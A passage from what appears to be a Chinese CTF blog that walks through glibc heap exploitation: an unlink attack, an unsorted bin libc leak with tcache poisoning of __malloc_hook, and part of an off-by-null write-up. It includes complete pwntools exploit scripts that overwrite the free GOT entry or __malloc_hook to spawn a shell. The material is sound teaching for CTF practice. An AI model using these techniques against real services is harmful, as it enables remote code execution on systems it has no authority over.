class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里不管我们申请的大小是多少，我们最多都可以写入0x100的字节大小。那么这里就存在了堆溢出。也就是说我们可以修改相邻下一个堆块的内容。此时我们去伪造一个fake_chunk，并且设置标志位为0。那么就可以触发unlink，也就是我们可以达到任意地址写的目的了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">20688</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: \n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;delete\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;show\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content\n&#x27;</span>)</span><br><span class="line">    io.send(pl)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#add(0x100)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">bss = <span class="number">0x6020c0</span></span><br><span class="line">fd = bss-<span class="number">0x18</span></span><br><span class="line">bk = bss-<span class="number">0x10</span></span><br><span class="line">pl1 = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(fd) + p64(bk) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,pl1)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pl2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(bss-<span class="number">0x18</span>) + p64(elf.got.free)</span><br><span class="line">edit(<span class="number">0</span>,pl2)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.free</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">edit(<span class="number">1</span>,p64(sys))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>来解释一下。首先在ida里找出buf的地址是0x6020c0。然后我们伪造的chunk的fd和bk是为了绕过unlink的保护。也就是确定脱链是脱除我们当前的chunk。然后就是通过修改buf的地址为free的got表地址。这样当我们去show某一个chunk的时候，就可以泄露出free的真实地址从而得到libc的基地址了。那么就可以通过改写free的got表地址为system地址，再释放一个提前写入&#x2F;bin&#x2F;sh\x00的堆块从而来getshell了。</p>
]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>Unsorted_bin_attack</title>
    <url>/2026/02/19/Unsorted-bin-attack/</url>
    <content><![CDATA[<h2 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a><code>Unsorted bin attack</code></h2><p>说是unsorted bin attack，在这里其实只是一个借助unsorted bin 来泄露libc的一种手段。</p>
<p>unsorted bin是一个双向链表，具体可以用下面这张图来演示。</p>
<p><img src="/images/heap5.png"></p>
<p>所以，如果当我们能访问到尾节点的时候，就可以打印出尾节点的fd，指向的就是main_arena的地址，从而泄露出libc的基地址。</p>
<h4 id="HNCTF-2022-WEEK4-ez-uaf"><a href="#HNCTF-2022-WEEK4-ez-uaf" class="headerlink" title="[HNCTF 2022 WEEK4]ez_uaf"></a><code>[HNCTF 2022 WEEK4]ez_uaf</code></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init_env(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy Note.&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      n4 = getnum();</span><br><span class="line">      <span class="keyword">if</span> ( n4 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n4 &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( n4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        add();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是熟悉的菜单来进行堆块的一些操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; heaplist[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">    size = getnum();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)size &gt; <span class="number">0x500</span> )           <span class="comment">// unsorted bins attack</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      heaplist[i] = <span class="built_in">malloc</span>(<span class="number">0x20u</span>LL);            <span class="comment">// struct chunk</span></span><br><span class="line">      <span class="keyword">if</span> ( !heaplist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = heaplist[i];</span><br><span class="line">      *(_QWORD *)(v1 + <span class="number">16</span>) = <span class="built_in">malloc</span>(size);      <span class="comment">// content chunk</span></span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)(heaplist[i] + <span class="number">16LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)(heaplist[i] + <span class="number">24LL</span>) = size;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Name: &quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, (<span class="type">void</span> *)heaplist[i], <span class="number">0x10u</span>LL) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Something error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)read(</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            *(<span class="type">void</span> **)(heaplist[i] + <span class="number">16LL</span>),<span class="comment">// cc</span></span><br><span class="line">                            *(<span class="type">int</span> *)(heaplist[i] + <span class="number">24LL</span>)) )<span class="comment">// size</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)(heaplist[i] + <span class="number">28LL</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面是add函数，通过分析，可以发现，这里创建了两个chunk，依旧是一个struct chunk，另一个content chunk。同时限制了content chunk的大小，要小于0x500。又因为tcache bins的最大字节数为0x410。所以这里可以申请一个大于0x410的chunk，再free掉。那么此时，这里申请的chunk就会被分类到unsorted bin里了。</p>
<p>然后edit函数可以往cc里写入数据，就不展示了。</p>
<p>漏洞点在于delete函数里，没有把释放后的指针置为空，所以可以非法访问。也就是uaf attack。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x10; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  n0x10 = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &lt; <span class="number">0x10</span> &amp;&amp; *(_DWORD *)(heaplist[n0x10] + <span class="number">28LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(heaplist[n0x10] + <span class="number">16LL</span>));   <span class="comment">// uaf</span></span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)heaplist[n0x10]);</span><br><span class="line">    result = heaplist[n0x10];</span><br><span class="line">    *(_DWORD *)(result + <span class="number">28</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show函数里就是把我们写入的cc打印出来。所以我们就可以先申请一个较大的堆块，再释放到unsorted bin里来泄露libc基地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x420</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>

<p>这里解释一下。由于unsorted bin里只有我们申请的idx &#x3D; 0的堆块。所以这里释放掉0后，0堆块里记录的fd和bk都是main_arena的地址了。这里创建的idx &#x3D; 1的堆块，是防止当把idx &#x3D; 0的chunk free掉以后，直接和top chunk合并。可以进ida里调试看到。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x55555555b280</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line">fd: 0x7ffff7bebca0</span><br><span class="line">bk: 0x7ffff7bebca0</span><br></pre></td></tr></table></figure>

<p>所以此时，我们调用show(0)，就可以泄露出libc基地址了。</p>
<p>然后我们可以用malloc_hook来打one_gadget。</p>
<p>malloc_hook是malloc的钩子函数，在执行malloc时，会先检测__malloc_hook的值，如果malloc_hook的值存在，则执行该地址（值里边表现为十六进制，可以成为地址），也就是说，如果我们成功劫持malloc_hook以后并修改它的值为one_gadget，我们就能getshell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook = base + libc.sym.__malloc_hook</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one_gadget = base + <span class="number">0x10a2fc</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(malloc_hook))</span><br></pre></td></tr></table></figure>

<p>进gdb里看一下。</p>
<p><img src="/images/heap6.png" alt="gdb"></p>
<p>这是delete(1)之前的情况，当我们释放1后，可以看到原本存放1的cc的地方，被改成了fd的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x55555555b6e0:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x55555555b6f0:	0x000055555555b260	0x000055555555b010 //fd bk</span><br><span class="line">0x55555555b700:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555555b710:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x55555555b720:	0x0000000000616161	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>然后再edit一下，就可以看到这里存放fd的地方被我们修改为了malloc_hook的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x55555555b6e0:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x55555555b6f0:	0x00007ffff7bebc30	0x000055555555b010 //malloc_hook</span><br><span class="line">0x55555555b700:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555555b710:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x55555555b720:	0x0000000000616161	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>然后我们只需要将malloc_hook伪造成fake_chunk，再写入one_gadget就可以了。这样等下一次去add chunk并且给chunk分配大小的的时候，就会执行我们的one_gadget了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Size:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>我们可以来看一下，当我们delete(1)了以后，我们tcache bins的管理情况。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30 [  3]: 0x55555555b6c0 —▸ 0x55555555b6f0 —▸ 0x7ffff7bebc30 (__malloc_hook) ◂— 0</span><br></pre></td></tr></table></figure>

<p>可以看到，这里有三个chunk。并且大小都是0x30。所以我们先申请一个0x10大小的chunk，会显示为0x21（其实只要不申请0x20大小的chunk，在这里都是可以的）。由于此时tcache里没有合适大小的，所以不会从这里的bins中获得。但是由于sc会申请掉0x30大小，所以这里的bins管理的chunk会变成两个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30 [  2]: 0x55555555b6f0 —▸ 0x7ffff7bebc30 (__malloc_hook) ◂— 0</span><br></pre></td></tr></table></figure>

<p>由于tcache bins采取的是<code>FIFO</code>，即先进先用的原则。所以最先被free掉的chunk被用掉。然后我们再add 4。这样我们的malloc_hook就会被当作我们的cc写入内容。此时写入我们的one_gadget就可以成功getshell了。</p>
<p>下面给出完整的exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;,24739)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(name))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(content))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.send(content)</span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">malloc_hook = base + libc.sym.__malloc_hook</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one_gadget = base + <span class="number">0x10a2fc</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Size:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>off_by_null</title>
    <url>/2026/02/23/off-by-null/</url>
    <content><![CDATA[<h1 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h1><p>其实是off by one的一种特殊形式。也就是我们能溢出size的最低一位字节，但是只能改写为\x00。</p>
<p>我们知道size的最低一字节是标志位P。它以为这我们能判断前一个堆块是否处于利用中。如果从1改写为0，那么就可以通过unlink的手法来达到一些意想不到的结果。</p>
<h2 id="巅峰极客-2022-smallcontainer"><a href="#巅峰极客-2022-smallcontainer" class="headerlink" title="[巅峰极客 2022]smallcontainer"></a><code>[巅峰极客 2022]smallcontainer</code></h2><p>版本是：2.27-3ubuntu1.5_amd64。这个时候unlink还没有打开检查size的保护。所以还会简单一些。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 n5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    n5 = retnum();</span><br><span class="line">    <span class="keyword">if</span> ( n5 == <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( n5 &gt; <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    <span class="keyword">switch</span> ( n5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice.&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Goodbye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是正常的菜单函数。同时这里的delete函数还没有uaf漏洞。（但是通过chunk overlap，我们可以做到一个类似于uaf的效果。）</p>
<p>这里的漏洞存在于check()。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 n0x10; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input index: &quot;</span>);</span><br><span class="line">  n0x10 = retnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &gt; <span class="number">0x10</span> || !heappp[n0x10] || !sizeee[n0x10] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)heappp[n0x10], sizeee[n0x10]);</span><br><span class="line">  <span class="keyword">return</span> check((_BYTE *)heappp[n0x10]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)*a1;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">0x11</span> )</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出来我们写入的内容会进行一次check。当遇到空（0）时停止。在停止之前读到的\x11字节都会改写为\x00。那么这里就存在off by null的漏洞了。如果我们申请一个0x210的chunk。并且前一个堆块在利用中。那么此时size的后三字节就会是0x211。当前一个chunk被填满不为0的字节后，就会改0x211为0x200了。此时可以触发unlink了。</p>
